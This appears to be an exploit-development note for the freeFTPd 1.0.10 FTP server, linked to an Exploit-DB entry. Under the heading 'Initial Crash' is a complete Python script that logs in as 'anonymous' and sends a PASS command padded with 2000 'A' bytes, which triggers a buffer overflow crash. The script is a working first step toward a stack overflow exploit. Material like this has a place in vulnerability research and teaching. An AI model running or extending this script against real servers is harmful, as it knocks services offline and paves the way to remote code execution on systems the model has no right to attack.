# freeFTPd 1.0.10

Downloaded from: https://www.exploit-db.com/exploits/27747

## Initial Crash

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 21
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 2000  # change me

payload = b'PASS '
payload += b"A" * CRASH_LEN

payload += b'\r\n'

with socket.create_connection(target) as sock:
    sock.recv(1024)
    sock.send(b"USER anonymous\r\n") 

    sock.recv(1024)
    sock.send(payload)   

    sock.close()
    
    print("\nDone!")
```
